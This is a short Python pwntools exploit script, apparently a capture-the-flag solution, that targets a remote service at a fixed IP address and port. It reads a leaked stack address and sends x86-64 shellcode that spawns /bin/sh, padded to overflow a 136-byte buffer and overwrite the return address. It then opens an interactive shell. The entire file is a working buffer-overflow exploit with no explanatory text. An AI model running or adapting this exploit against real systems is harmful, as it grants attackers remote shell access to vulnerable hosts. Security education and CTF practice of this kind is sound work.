from pwn import *

r = remote('152.118.201.241', 3006)

r.recvuntil(b'Address: ')
n_addr = int(r.recvline().strip(), 16)

# buffer ada di n + 4
buf_addr = n_addr + 0x4

shellcode = b"\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

payload  = shellcode
payload += b"A" * (136 - len(shellcode))
payload += p64(buf_addr)

r.sendline(payload)

r.interactive()